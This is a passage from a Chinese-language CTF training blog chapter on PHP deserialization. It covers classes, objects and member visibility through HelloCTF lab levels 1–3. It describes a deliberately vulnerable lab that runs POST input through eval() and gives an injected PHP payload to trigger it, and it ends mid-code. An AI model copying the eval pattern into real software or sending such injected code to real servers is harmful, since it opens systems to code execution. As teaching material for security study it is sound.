<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 8.1.1">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/sign.ico">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/small.ico">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"hnu-legend1440.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="飞书链接:https:&#x2F;&#x2F;icnewi51k2yp.feishu.cn&#x2F;wiki&#x2F;Tcjmwc5RAigdUUk2ZmSc8rfan1c?from&#x3D;from_copylink [Week7.1]php 反序列化绪论在 Web 安全与 CTF 竞赛中，PHP 反序列化漏洞始终是高频且核心的考点—— 它不像文件上传漏洞那样 “直观可见”，却常隐藏在代码逻辑深处，成为突破服务器权限的关键入口。本章我们将">
<meta property="og:type" content="article">
<meta property="og:title" content="第七章-PHP反序列化">
<meta property="og:url" content="http://hnu-legend1440.com/2026/01/21/%E7%AC%AC%E4%B8%83%E7%AB%A0-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
<meta property="og:site_name" content="拂云观 · legend1440">
<meta property="og:description" content="飞书链接:https:&#x2F;&#x2F;icnewi51k2yp.feishu.cn&#x2F;wiki&#x2F;Tcjmwc5RAigdUUk2ZmSc8rfan1c?from&#x3D;from_copylink [Week7.1]php 反序列化绪论在 Web 安全与 CTF 竞赛中，PHP 反序列化漏洞始终是高频且核心的考点—— 它不像文件上传漏洞那样 “直观可见”，却常隐藏在代码逻辑深处，成为突破服务器权限的关键入口。本章我们将">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://hnu-legend1440.com/images/Q9DWbXJRdoVEDOxXxG0cNB6unVd.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/DgdkbICwzo5q4RxfdbhcnB01njg.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/FAntbhPC4oOGlWxMobWcBj2anhb.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/T8iHbmRvRosn1Yxxfp7cvzBbn1f.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/N6tKbQefno9qBLxNuYMclJLYnRb.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/FtvpbRTuKoQEqyxrHCJcs0grnph.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/HBhtbfoUwoRKG8xLguEcxFZynac.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/EGTjbmsoIokRusxPD1Tcm0Tcngd.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/LwVtbX8Kfoh3lexYouYc6gRXnhh.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/J35JbiRnSomCK8xybalctO4RnKf.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/J5tYb2rJiowzeSxTqlucIpF6nYe.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/PDSfbOniJovwaYx0wJDc0kQ8nnd.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/JVdfb4wwWoCOi5xNd7LcrJ8ond4.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/HUa1b2fnooitxxxhTWIcRsD8nBg.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/AuQAbMrxHorkYqxIFXyclJqZnAu.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/KOYtbquYJo3BYsxLbQ6cgtVsnub.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/QxaJbkma5oyEsBximMociLZLnFc.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/WFfMbUSvVo2aG0xJ1k0cMaRSnBh.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/WehjbaIlQo9y1LxBQPqcSqilnWc.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/XkgfbNZUUoZggZxUsmAcW0wQnpv.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/MKkbb9MXdodvS8x7ZAxc6qEQnIc.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/Ds6ybkZUSo3SIGxkNmbcxkC2ng1.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/ZHrZbZBsyoXcr4x9A6bcQTE1nWd.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/YXb3bWlnhoIvmIxEOyRc5fB4nVc.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/CoXvb2HMyo3kcexkOW2cyTegnNc.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/FInjbCfZeoD0fcxOl3qc2Ie0nsg.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/W1W0bEvMvoseLAxhB4Hc4ksfnSd.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/Y16MbaAGMo10Q5xbH8yc3weWnag.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/ZtyBbZ7X2oWCJBxpjyOclZsXnlh.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/HekjbvMf7oNvd6xQk93cOs3Kn4g.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/VWQObHi1No0iIZxRBVvcM4axntb.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/TF8kbX4hJo42z9x9k1gcfzdInMe.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/GhZfb0svvoZ1pXxwzQUcjejOnjc.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/Ehz0bQXm6oW3vvxLlilcvdm5nHO.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/JAUHbBCSKoIRZ3xdzkdc06O1nmh.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/WV8wbY11BoSWe3xD5KYcvEDbnBb.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/SwVZbfOVcoIKafxqKuTcNLpjnlg.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/S8LKbFM7EoxffJxL8kxclpzKncc.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/PMGNbFb5nobCCkx8YrxcYXynnPh.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/M7Zkb43vroU4sxxTwLUcIgt9nqe.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/YR2TbSfgsoSOkMx9QQFckxbGn4f.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/Uyl9bJOGFodlCYxvx9vcKIT1ndb.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/Cyswbckcgo2OElx3cItcqaAYn5g.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/CVMhbVf5holiOGxr3Gkcn36UnLh.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/UMRGb3tMjose6ExTQeYcwAOOngc.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/Lm0jbSPivoVJWAxLziBc6iNWnXe.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/ZaIHb6Rghoa0i9xcJqXcgNIEnTd.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/IRAobfMiBo5eJ0xZ7lbcM3Ranme.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/K2ypb9ndAoBnicx3PrXc6sYtnAI.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/OXhabK5zVoEQq3xAynqc8aAOnde.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/L93Obcn3To6b1tx2G2xc3XWEnhc.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/C9yRbdoVvoZ2lyxJtqecGFNlnwt.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/SIkCbdL82oJ0RFx25sZcHP89nac.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/LcgIb1bo9oOQ8Fx0vJ9cguZanwb.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/OfFKb20qvoKxnKxMO0jcWx1Eng8.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/CoYZbHHJeoIOoJxNTQlcICLIn06.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/M8rAbluBPo7WSvxdAUhc2X7hnxd.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/CeVEbqqpIoAcscxtRXDckXNhnQg.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/W1KtbFqYuoeOamx5cgecfcjSnwd.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/GqJXbfMeXom4s3xr5VEcgRennrb.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/G1oFbWGGTownZpxeXgmch0jrnCb.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/OABTb1e4xofiiKxkbofca3I0nzc.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/HoXXbNQBSoa6Cnx8cZWcyZSvnPd.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/ZvOFbOwReoA7KVxxYj8cWulxnZe.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/OFtNb9ESdoXJU0xgzRWc6C02nFg.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/DrmPbxar3olRSrxJS43cKU9Anrg.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/C6AGbActUomnVPxIXvrcWKOdnag.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/SEAkbbO02oKSICxSluRcQFM6nLh.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/BFjublVO5o5nKnxsJ5ZcJbD0nfh.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/J3nZbT9KzoUNnQx8d96coh8Xnke.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/FQDVbUiOYoZy1Qx7AvpclY9cnxf.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/BPXybSq5vowZWzx4K1KcijGwnsb.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/QwgqbwlE6om0krxqEmHctnhWnCh.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/WV3lbHmCxonDcZxaecRcOP8fnZb.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/KufdbqxsbowPFMxDCTfcBhifnIh.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/ZumHb7fuaoBULox6ZSlcEw2Nnmd.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/ASXjb0SJmociZxxQlBwcYf3nn6g.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/Xg5abFXEjoyXVoxt8SDco4qZnRd.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/NWvjbAHfHo0k44x0tGYcK7YZnTe.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/KujibsGt2ocLiTx8xNBcFUXRnfc.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/QBAzbVCV4oZrcUxvTy0cxN8XnOb.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/AaMTbwZofo4KICxNSMxcR2rWnkc.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/HjMNb054towTR6xKXB0cTdPunPb.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/GhprbGYRJoe3a2x1GSKce6TMnqd.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/EelMbnocWoiN1wxjEMqcJjenn2f.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/TyIRbe0BaogdrAxnhV3cEIEonPd.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/VCHXbKuCqoixF8xeSJfcnDOEne8.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/IfjzbJzSAo62haxAQaJcvPpanvg.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/EKzlbTdqUoqglJxFPV6cYD04nge.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/Q0I3blbfsooQKLxSRwuckW6vnNe.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/Eb4Gb1H5GoxGD4x3V3Fc6Gkcntb.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/Yasvb8CYIoS7W9xBDqacXblxnle.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/HpRvbx2fqoW2cgxVH6pc0LJEnxb.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/LkpDbRsIOobx0Bx6Zc3cZ45Yn3n.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/VCjtbha0ZoTI8QxAfVgcMsDPnDe.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/P4MvbQcF7o0ecSxG6eacKQ1lnFf.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/XvkqbCwnPoZ2voxOKbBcvAGynmd.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/NTvtbevuno3dxFxa3ivcwAOonIP.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/PNwVbigfYo2SzLxwIhfcFEdUnFh.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/AWWnbPLcbopJiixTovYcwYUxnpb.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/LDoybzVHXobPTXxsfTDcIbSMnAf.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/F6Ccb6aeGoQLdHxRbcFcjkTunDb.png">
<meta property="og:image" content="http://hnu-legend1440.com/images/SR6LbHXkVo5MQMxOZMhcvN4Xndc.png">
<meta property="article:published_time" content="2026-01-20T17:49:30.000Z">
<meta property="article:modified_time" content="2026-01-20T17:51:19.179Z">
<meta property="article:author" content="legend1440">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://hnu-legend1440.com/images/Q9DWbXJRdoVEDOxXxG0cNB6unVd.png">

<link rel="canonical" href="http://hnu-legend1440.com/2026/01/21/%E7%AC%AC%E4%B8%83%E7%AB%A0-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>第七章-PHP反序列化 | 拂云观 · legend1440</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">拂云观 · legend1440</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-schedule">

    <a href="/categories/schedule/" rel="section"><i class="fa fa-skating fa-fw"></i>期末突击</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-chess fa-fw"></i>往世乐土</a>

  </li>
        <li class="menu-item menu-item-training">

    <a href="/categories/training/" rel="section"><i class="fa fa-yin-yang fa-fw"></i>集训修行</a>

  </li>
        <li class="menu-item menu-item-wp">

    <a href="/categories/WP/" rel="section"><i class="fa fa-feather fa-fw"></i>全面战场</a>

  </li>
        <li class="menu-item menu-item-puzzles">

    <a href="/categories/puzzles/" rel="section"><i class="fa fa-spa fa-fw"></i>练习札记</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hnu-legend1440.com/2026/01/21/%E7%AC%AC%E4%B8%83%E7%AB%A0-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="legend1440">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="拂云观 · legend1440">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          第七章-PHP反序列化
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2026-01-21 01:49:30 / 修改时间：01:51:19" itemprop="dateCreated datePublished" datetime="2026-01-21T01:49:30+08:00">2026-01-21</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/training/" itemprop="url" rel="index"><span itemprop="name">-training</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span id="busuanzi_value_page_pv"></span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>飞书链接:<a target="_blank" rel="noopener" href="https://icnewi51k2yp.feishu.cn/wiki/Tcjmwc5RAigdUUk2ZmSc8rfan1c?from=from_copylink">https://icnewi51k2yp.feishu.cn/wiki/Tcjmwc5RAigdUUk2ZmSc8rfan1c?from=from_copylink</a></p>
<h1 id="Week7-1-php-反序列化绪论"><a href="#Week7-1-php-反序列化绪论" class="headerlink" title="[Week7.1]php 反序列化绪论"></a>[Week7.1]php 反序列化绪论</h1><p>在 Web 安全与 CTF 竞赛中，PHP 反序列化漏洞始终是<strong>高频且核心的考点</strong>—— 它不像文件上传漏洞那样 “直观可见”，却常隐藏在代码逻辑深处，成为突破服务器权限的关键入口。本章我们将围绕这一知识点展开系统学习。</p>
<p><em>注:反序列化靶场在本节作为例题出现过的，本章实验就不会再出现了</em></p>
<h2 id="PHP-类与对象"><a href="#PHP-类与对象" class="headerlink" title="PHP 类与对象"></a>PHP 类与对象</h2><p><em>类和对象也是我们下学期专业课上关于面向对象学习的内容，因此不局限于 CTFweb 知识，再认真学习一些细节</em></p>
<p>反序列化的漏洞围绕 “对象” 展开，先搞懂 PHP 中 “类” 和 “对象” 的基本用法.</p>
<h3 id="什么是-“类”？——-对象的-“模板”"><a href="#什么是-“类”？——-对象的-“模板”" class="headerlink" title="什么是 “类”？—— 对象的 “模板”"></a>什么是 “类”？—— 对象的 “模板”</h3><p>类是用 <code>class</code> 定义的 “蓝图”，包含<strong>属性</strong>（变量，比如 “姓名”“年龄”）和<strong>方法</strong>（函数，比如 “说话”“做事”），举个最简单的例子：</p>
<p><img src="/images/Q9DWbXJRdoVEDOxXxG0cNB6unVd.png"></p>
<ul>
<li>理解：<code>class User</code> 就像一个 “用户模板”，规定了 “用户” 应该有 “名字、年龄” 这些属性，以及 “打招呼” 这个行为。</li>
</ul>
<h3 id="什么是-“对象”？——-类的-“实例”"><a href="#什么是-“对象”？——-类的-“实例”" class="headerlink" title="什么是 “对象”？—— 类的 “实例”"></a>什么是 “对象”？—— 类的 “实例”</h3><p>对象是用 <code>new</code> 关键字创建的 “具体个体”，从 “模板” 生成的 “实际存在的东西”，比如：</p>
<p><img src="/images/DgdkbICwzo5q4RxfdbhcnB01njg.png"></p>
<ul>
<li>关键：每个对象都有自己的属性值，但方法（行为）和类保持一致 —— 就像 “小明”“小红” 都是 “User 类” 的对象，但名字、年龄不同，都能 “打招呼”。</li>
</ul>
<h3 id="知识点核心"><a href="#知识点核心" class="headerlink" title="知识点核心"></a>知识点核心</h3><ul>
<li>类是 “模板”，对象是 “模板造出来的具体东西”；</li>
<li>操作对象时，用 <code>-&gt;</code> 访问属性 &#x2F; 方法（比如 <code>$obj-&gt;属性名</code>、<code>$obj-&gt;方法名()</code>）。</li>
</ul>
<p><u>下面我们将用几个反序列化靶场的关卡,巩固一下类和对象相关知识</u></p>
<h2 id="反序列化靶场-Level1-类的实例化"><a href="#反序列化靶场-Level1-类的实例化" class="headerlink" title="*[反序列化靶场]Level1-类的实例化"></a>*[反序列化靶场]Level1-类的实例化</h2><p>先读代码，我们要把 FLAG 类进行实例化，因为 <code>$_POST[&#39;code&#39;]</code> 获取的是 HTTP 请求中传递的「文本数据」，PHP 会默认把它解析为字符串类型（哪怕你传的是数字、代码，本质也是字符串）</p>
<p>所以 code 一开始会被赋成一个字符串(<code>$_POST</code>（以及 <code>$_GET</code>&#x2F;<code>$_REQUEST</code>）返回的永远是字符串（或数组）)，我们需要用后面的 eval 函数来执行 php 代码(而非 lunix 代码,lunix 代码不能用 eval 执行)，从而创建一个 FLAG 类对象.</p>
<p>我们 post:code&#x3D;new FLAG(); 注意这是一行命令，所以末尾要加分号</p>
<p>eval 函数随即执行此条命令，FLAG 类的新对象被创建.</p>
<p>但在这里要注意的是，新创建的对象是匿名对象(会立即被销毁，触发析构函数，但也会触发构造函数 construct)，而非名为 code，code 只作为命令被执行.</p>
<p>读代码，每个对象的 flag 属性是相同的，触发构造函数时，这个相同的属性就会被打印，这就是 flag</p>
<p><img src="/images/FAntbhPC4oOGlWxMobWcBj2anhb.png"></p>
<p><img src="/images/T8iHbmRvRosn1Yxxfp7cvzBbn1f.png"></p>
<h4 id="拓展-给变量命名的情况"><a href="#拓展-给变量命名的情况" class="headerlink" title="拓展:给变量命名的情况"></a>拓展:给变量命名的情况</h4><p>如果我们给这个变量命名，还能拿到 flag 吗?</p>
<p>显然是可以的 因为拿 flag 的关键是构造函数的触发</p>
<p><em>注，这里输入的 code&#x3D;<strong>$obj&#x3D;new FLAG()</strong>;”<strong>$obj&#x3D;new FLAG()</strong>“会以纯文本形式被 PHP 接收，而不会被当做赋值运算符的运算表达式从右到左执行,为 code 直接赋对象 FLAG（__$code__始终是字符串，不是对象）</em></p>
<p><img src="/images/N6tKbQefno9qBLxNuYMclJLYnRb.png"></p>
<h2 id="反序列化靶场-Level2-值的传递"><a href="#反序列化靶场-Level2-值的传递" class="headerlink" title="*[反序列化靶场]Level2-值的传递"></a>*[反序列化靶场]Level2-值的传递</h2><p>读代码，这里是最终打印对象 target 的属性 free_flag.</p>
<p><img src="/images/FtvpbRTuKoQEqyxrHCJcs0grnph.png"></p>
<p>这里需要给 target 中的 free_flag 赋值成$flag_string的值,让它打印$flag_string 即可</p>
<p><img src="/images/HBhtbfoUwoRKG8xLguEcxFZynac.png"></p>
<h2 id="反序列化靶场-Level3-值的权限"><a href="#反序列化靶场-Level3-值的权限" class="headerlink" title="*[反序列化靶场]Level3-值的权限"></a>*[反序列化靶场]Level3-值的权限</h2><p>先来了解下值的权限</p>
<p><img src="/images/EGTjbmsoIokRusxPD1Tcm0Tcngd.png"></p>
<p>何为“子类能访问”?</p>
<p>一创建一个类的子类，它就具有父类除 private 以外的全部成员变量和成员函数，“访问” 就是「读取 &#x2F; 修改 &#x2F; 调用」。</p>
<p>对于 public，我们可以在类的大括号外用”类变量名-&gt; 成员变量名”随便访问，输类变量名-&gt; 成员变量名即可。</p>
<p>对于 protected，在类外即主函数部分，我们不得不先在类内创建成员函数，通过成员函数中的”类变量名-&gt; 成员变量名”加上外部对本成员函数的调用实现间接性的访问，而在类内(尤其是创建成员函数)则直接用”类变量名-&gt; 成员变量名”访问即可。</p>
<p>对于 private，则既需要用 protected 的方法访问成员，还要求访问的就是本类的成员而非父类的成员(因为子类根本不继承父类的成员变量和成员函数)</p>
<p>阅读本题(从第 58 行开始是网页回显),我们发现 flag 被拆成了三份，分别是 public，protected，private 级别的对象.</p>
<p>**注:类的成员函数（方法）如果不显式声明修饰符（public&#x2F;protected&#x2F;private），默认就是 **<strong>public</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">--- HelloCTF - 反序列化靶场 关卡 3 : 对象中值的权限 ---  </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">HINT：尝试将flag传递出来~ </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*- </span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 探姬 </span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30 </span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs </span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com </span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$public_flag</span> = <span class="string">&quot;NSSCTF&#123;?&quot;</span>; </span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$protected_flag</span> = <span class="string">&quot;?&quot;</span>; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$private_flag</span> = <span class="string">&quot;?&#125;&quot;</span>; </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_protected_flag</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;protected_flag; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_private_flag</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;private_flag; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SubFLAG</span> <span class="keyword">extends</span> <span class="title">FLAG</span></span>&#123; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show_protected_flag</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;protected_flag; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show_private_flag</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;private_flag; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span 